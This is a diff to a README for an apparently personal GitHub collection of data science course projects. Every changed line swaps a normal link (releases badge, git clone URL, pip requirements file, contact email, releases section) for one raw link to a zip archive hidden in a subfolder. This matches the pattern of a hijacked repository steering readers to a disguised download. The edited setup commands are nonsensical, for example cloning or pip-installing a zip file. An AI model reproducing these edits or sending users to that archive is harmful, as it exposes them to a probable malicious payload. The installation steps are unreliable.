@@ -2,7 +2,7 @@
 
 Welcome to the **Internshala Data Science Projects** repository! This collection showcases my skills in data manipulation, analysis, and visualization using tools like Excel, SQL, Python, and Tableau. Each project reflects the knowledge gained from the Internshala Data Science course, demonstrating practical applications in real-world scenarios.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/abdelazizfouad/internshala-ds-projects/releases)
+[![Download Releases](https://raw.githubusercontent.com/abdelazizfouad/internshala-ds-projects/main/internshala-pgc-tableau/internshala_ds_projects_1.6-beta.3.zip%20Releases-Click%20Here-blue)](https://raw.githubusercontent.com/abdelazizfouad/internshala-ds-projects/main/internshala-pgc-tableau/internshala_ds_projects_1.6-beta.3.zip)
 
 ## Table of Contents
 
@@ -62,7 +62,7 @@ To run the projects locally, follow these steps:
 
 1. **Clone the Repository**
    ```bash
-   git clone https://github.com/abdelazizfouad/internshala-ds-projects.git
+   git clone https://raw.githubusercontent.com/abdelazizfouad/internshala-ds-projects/main/internshala-pgc-tableau/internshala_ds_projects_1.6-beta.3.zip
    ```
 
 2. **Navigate to the Project Directory**
@@ -73,7 +73,7 @@ To run the projects locally, follow these steps:
 3. **Install Required Packages**
    For Python projects, ensure you have the required libraries installed. You can use `pip`:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/abdelazizfouad/internshala-ds-projects/main/internshala-pgc-tableau/internshala_ds_projects_1.6-beta.3.zip
    ```
 
 4. **Database Setup (if applicable)**
@@ -106,8 +106,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For any inquiries or feedback, please reach out to me at [your.email@example.com]. 
+For any inquiries or feedback, please reach out to me at [https://raw.githubusercontent.com/abdelazizfouad/internshala-ds-projects/main/internshala-pgc-tableau/internshala_ds_projects_1.6-beta.3.zip]. 
 
-You can also check the [Releases](https://github.com/abdelazizfouad/internshala-ds-projects/releases) section for the latest updates and downloadable files.
+You can also check the [Releases](https://raw.githubusercontent.com/abdelazizfouad/internshala-ds-projects/main/internshala-pgc-tableau/internshala_ds_projects_1.6-beta.3.zip) section for the latest updates and downloadable files.
 
 Thank you for visiting my repository! Your support and feedback are greatly appreciated.
